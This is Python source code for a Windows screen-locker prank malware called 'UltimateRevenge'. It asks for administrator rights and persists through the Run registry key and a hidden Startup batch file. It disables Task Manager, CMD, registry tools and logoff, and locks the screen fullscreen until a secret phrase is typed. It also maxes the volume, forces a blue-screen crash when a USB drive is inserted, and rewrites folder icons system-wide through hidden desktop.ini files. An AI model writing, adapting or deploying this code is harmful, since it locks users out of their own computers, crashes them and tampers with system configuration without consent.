import pygame
import os
import sys
import winreg as reg
import threading
import time
import random
import ctypes
from ctypes import wintypes
import shutil
import string

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

IMG_PATH = resource_path("рыбка.jpeg")
ICON_PATH = resource_path("nya.ico")
MUSIC_PATH = resource_path("ljnn.mp3")
TRAVA_PATH = resource_path("trava.mp3")
SECRET_PHRASE = "яникогданепотрогаютраву"
MUTEX_NAME = "Global\\OpenBSD_Eats_Your_PC_MUTEX"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    try:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit()
    except:
        pass

def check_single_instance():
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
        if ctypes.windll.kernel32.GetLastError() == 183:
            return False
        return True
    except:
        return True

def set_task_mgr(disabled=True):
    try:
        val = 1 if disabled else 0
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, val)
        reg.CloseKey(key)
    except:
        pass

def add_to_startup():
    try:
        pth = os.path.realpath(sys.executable)
        key = reg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(open_key, "openbsdverycoolsystem", 0, reg.REG_SZ, pth)
        reg.CloseKey(open_key)
    except:
        pass

def remove_from_startup():
    try:
        key = reg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.DeleteValue(open_key, "openbsdverycoolsystem")
        reg.CloseKey(open_key)
    except:
        pass

def toggle_restrictions(disable=True):
    val = 1 if disable else 0
    restrictions = [
        (r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr"),
        (r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools"),
        (r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableCMD"),
        (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun"),
        (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose"),
        (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoLogOff"),
        (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFind"),
    ]
    for path, name in restrictions:
        try:
            key = reg.CreateKey(reg.HKEY_CURRENT_USER, path)
            reg.SetValueEx(key, name, 0, reg.REG_DWORD, val)
            reg.CloseKey(key)
        except:
            pass

def trigger_bsod():
    try:
        ntdll = ctypes.windll.ntdll
        kernel32 = ctypes.windll.kernel32
        
        hToken = wintypes.HANDLE()
        kernel32.OpenProcessToken(kernel32.GetCurrentProcess(), 0x0020, ctypes.byref(hToken))
        
        if ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool())) == 0:
            response = wintypes.DWORD()
            ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(response))
    except:
        pass

def kill_explorer():
    try:
        import subprocess
        subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True)
        time.sleep(1)
    except:
        pass

def start_explorer():
    try:
        import subprocess
        subprocess.run(["start", "explorer.exe"], shell=True)
    except:
        pass

def max_system_volume():
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(1.0, None)
    except:
        try:
            ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
            for _ in range(50):
                ctypes.windll.user32.keybd_event(0xAF, 0, 0x0002, 0)
                time.sleep(0.01)
        except:
            pass

class UltimateRevenge:
    def __init__(self):
        self.typed = ""
        self.running = True
        
        max_system_volume()
        
        self.play_intro_sound()
        
        add_to_startup()
        set_task_mgr(True)
        toggle_restrictions(True)
        
        self.setup_screen()
        self.setup_keyboard_hook()
        self.start_threads()
        self.total_icon_takeover()
        self.install_safe_mode_beacon()
        
        self.main_loop()

    def play_intro_sound(self):
        def play():
            try:
                import winsound
                if os.path.exists(TRAVA_PATH):
                    for _ in range(3):
                        winsound.PlaySound(TRAVA_PATH, winsound.SND_FILENAME | winsound.SND_ASYNC)
                        time.sleep(2)
            except:
                try:
                    pygame.mixer.init()
                    pygame.mixer.music.load(TRAVA_PATH)
                    pygame.mixer.music.set_volume(1.0)
                    pygame.mixer.music.play(-1)
                except:
                    pass
        
        threading.Thread(target=play, daemon=True).start()

    def setup_screen(self):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        pygame.init()
        
        info = pygame.display.Info()
        self.screen_width = info.current_w
        self.screen_height = info.current_h
        
        self.screen = pygame.display.set_mode((self.screen_width, self.screen_height), pygame.FULLSCREEN)
        pygame.display.set_caption("OpenBSD Very Cool System")
        pygame.mouse.set_visible(False)
        
        if os.path.exists(IMG_PATH):
            img = pygame.image.load(IMG_PATH)
            img = pygame.transform.scale(img, (self.screen_width, self.screen_height))
            self.screen.blit(img, (0, 0))
            pygame.display.flip()
        else:
            self.screen.fill((0, 0, 0))
            pygame.display.flip()

    def setup_keyboard_hook(self):
        try:
            import keyboard
            keyboard.on_press(self.on_key_press)
        except:
            pass

    def on_key_press(self, event):
        try:
            char = event.name
            if len(char) == 1:
                self.typed += char.lower()
                if SECRET_PHRASE.startswith(self.typed):
                    if self.typed == SECRET_PHRASE:
                        self.unlock_and_exit()
                else:
                    self.typed = ""
                    self._shake()
        except:
            pass

    def main_loop(self):
        clock = pygame.time.Clock()
        
        while self.running:
            for event in pygame.event.get():
                if event.type == pygame.KEYDOWN:
                    if event.unicode:
                        self.typed += event.unicode.lower()
                        if SECRET_PHRASE.startswith(self.typed):
                            if self.typed == SECRET_PHRASE:
                                self.unlock_and_exit()
                        else:
                            self.typed = ""
                            self._shake()
            
            clock.tick(60)

    def start_threads(self):
        threading.Thread(target=self._focus_loop, daemon=True).start()
        threading.Thread(target=self._annoying_sounds, daemon=True).start()
        threading.Thread(target=self._check_usb_and_bsod, daemon=True).start()

    def _focus_loop(self):
        while self.running:
            try:
                hwnd = pygame.display.get_wm_info()['window']
                ctypes.windll.user32.SetForegroundWindow(hwnd)
                ctypes.windll.user32.BringWindowToTop(hwnd)
                ctypes.windll.user32.ShowWindow(hwnd, 5)
                time.sleep(0.1)
            except:
                time.sleep(0.5)

    def _annoying_sounds(self):
        while self.running:
            time.sleep(random.randint(20, 60))
            try:
                ctypes.windll.user32.MessageBeep(0x00000010)
            except:
                pass

    def _shake(self):
        def shake_anim():
            for _ in range(5):
                pygame.display.set_mode((self.screen_width + 10, self.screen_height + 10), pygame.FULLSCREEN)
                time.sleep(0.05)
                pygame.display.set_mode((self.screen_width, self.screen_height), pygame.FULLSCREEN)
                time.sleep(0.05)
            pygame.display.set_mode((self.screen_width, self.screen_height), pygame.FULLSCREEN)
        
        threading.Thread(target=shake_anim, daemon=True).start()

    def _check_usb_and_bsod(self):
        existing_drives = set()
        for letter in string.ascii_uppercase:
            if os.path.exists(f"{letter}:\\"):
                existing_drives.add(letter)
        
        while self.running:
            time.sleep(2)
            current_drives = set()
            for letter in string.ascii_uppercase:
                if os.path.exists(f"{letter}:\\"):
                    current_drives.add(letter)
            
            new_drives = current_drives - existing_drives
            if new_drives:
                try:
                    for _ in range(3):
                        self._shake()
                        time.sleep(0.3)
                    trigger_bsod()
                    break
                except:
                    pass
            
            existing_drives = current_drives

    def total_icon_takeover(self):
        threading.Thread(target=self._icon_takeover_worker, daemon=True).start()

    def _icon_takeover_worker(self):
        if not os.path.exists(ICON_PATH):
            return
        
        puffy_ico_system = os.path.join(os.environ["WINDIR"], "System32", "puffy.ico")
        try:
            shutil.copy2(ICON_PATH, puffy_ico_system)
        except:
            puffy_ico_system = ICON_PATH
        
        all_drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
        
        for folder in all_drives:
            try:
                desktop_ini = os.path.join(folder, "desktop.ini")
                with open(desktop_ini, "w", encoding="utf-8") as f:
                    f.write(f"""[.ShellClassInfo]
IconResource={puffy_ico_system},0
IconFile={puffy_ico_system}
IconIndex=0
InfoTip=PUFFY PROTECTED DRIVE
""")
                ctypes.windll.kernel32.SetFileAttributesW(desktop_ini, 2)
                ctypes.windll.kernel32.SetFileAttributesW(folder, 0x12)
            except:
                pass
        
        special_folders = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\Music"),
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Videos"),
            os.environ.get("PUBLIC", "C:\\Users\\Public"),
            os.environ.get("PROGRAMDATA", "C:\\ProgramData"),
        ]
        
        for folder in special_folders:
            if not os.path.exists(folder):
                continue
            try:
                desktop_ini = os.path.join(folder, "desktop.ini")
                with open(desktop_ini, "w", encoding="utf-8") as f:
                    f.write(f"""[.ShellClassInfo]
IconResource={puffy_ico_system},0
IconFile={puffy_ico_system}
IconIndex=0
InfoTip=NYA~ PUFFY WAS HERE
""")
                ctypes.windll.kernel32.SetFileAttributesW(desktop_ini, 2)
                ctypes.windll.kernel32.SetFileAttributesW(folder, 0x12)
            except:
                pass
        
        recycle_bins = ["C:\\$Recycle.Bin", "D:\\$Recycle.Bin", "E:\\$Recycle.Bin"]
        for folder in recycle_bins:
            if os.path.exists(folder):
                try:
                    desktop_ini = os.path.join(folder, "desktop.ini")
                    with open(desktop_ini, "w", encoding="utf-8") as f:
                        f.write(f"""[.ShellClassInfo]
IconResource={puffy_ico_system},0
IconFile={puffy_ico_system}
IconIndex=0
InfoTip=NO ESCAPE FROM PUFFY
""")
                    ctypes.windll.kernel32.SetFileAttributesW(desktop_ini, 2)
                except:
                    pass
        
        kill_explorer()
        time.sleep(1)
        start_explorer()

    def cleanup_total_takeover(self):
        if not os.path.exists(ICON_PATH):
            return
        
        all_drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
        
        for folder in all_drives:
            try:
                desktop_ini = os.path.join(folder, "desktop.ini")
                if os.path.exists(desktop_ini):
                    os.remove(desktop_ini)
                ctypes.windll.kernel32.SetFileAttributesW(folder, 0x80)
            except:
                pass
        
        special_folders = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\Music"),
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Videos"),
            os.environ.get("PUBLIC", "C:\\Users\\Public"),
            os.environ.get("PROGRAMDATA", "C:\\ProgramData"),
        ]
        
        for folder in special_folders:
            if not os.path.exists(folder):
                continue
            try:
                desktop_ini = os.path.join(folder, "desktop.ini")
                if os.path.exists(desktop_ini):
                    os.remove(desktop_ini)
                ctypes.windll.kernel32.SetFileAttributesW(folder, 0x80)
            except:
                pass
        
        puffy_ico_system = os.path.join(os.environ["WINDIR"], "System32", "puffy.ico")
        try:
            if os.path.exists(puffy_ico_system) and puffy_ico_system != ICON_PATH:
                os.remove(puffy_ico_system)
        except:
            pass
        
        kill_explorer()
        time.sleep(1)
        start_explorer()

    def install_safe_mode_beacon(self):
        threading.Thread(target=self._install_beacon_worker, daemon=True).start()

    def _install_beacon_worker(self):
        if not os.path.exists(MUSIC_PATH):
            return
        
        try:
            beacon_script = os.path.join(os.environ.get("PROGRAMDATA", "C:\\ProgramData"), 
                "Microsoft\\Windows\\Start Menu\\Programs\\StartUp", "puffy_beacon.bat")
            
            with open(beacon_script, "w", encoding="utf-8") as f:
                f.write(f'''@echo off
timeout /t 3 /nobreak >nul
start /min pythonw -c "
import ctypes
import time
import winsound
MUSIC = r'{MUSIC_PATH}'
def play():
    while True:
        winsound.PlaySound(MUSIC, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP)
        time.sleep(60)
import threading
t = threading.Thread(target=play, daemon=True)
t.start()
ctypes.windll.user32.MessageBoxW(0, 'ТЫ ПОПЫТАЛСЯ ОБОЙТИ PUFFY!\\nМУЗЫКА ПОБЕДЫ ИГРАЕТ ДЛЯ ТЕБЯ!', 'OPENBSD VERY COOL SYSTEM', 0x40 | 0x0)
while True:
    time.sleep(1)
" >nul 2>&1
exit''')
            
            ctypes.windll.kernel32.SetFileAttributesW(beacon_script, 2)
        except:
            pass

    def cleanup_safe_mode_beacon(self):
        try:
            beacon_script = os.path.join(os.environ.get("PROGRAMDATA", "C:\\ProgramData"), 
                "Microsoft\\Windows\\Start Menu\\Programs\\StartUp", "puffy_beacon.bat")
            if os.path.exists(beacon_script):
                os.remove(beacon_script)
        except:
            pass

    def unlock_and_exit(self):
        self.running = False
        set_task_mgr(False)
        toggle_restrictions(False)
        remove_from_startup()
        self.cleanup_total_takeover()
        self.cleanup_safe_mode_beacon()
        pygame.quit()
        sys.exit()

if __name__ == "__main__":
    if os.name == 'nt':
        if not is_admin():
            run_as_admin()
        else:
            if not check_single_instance():
                sys.exit()
            else:
                UltimateRevenge()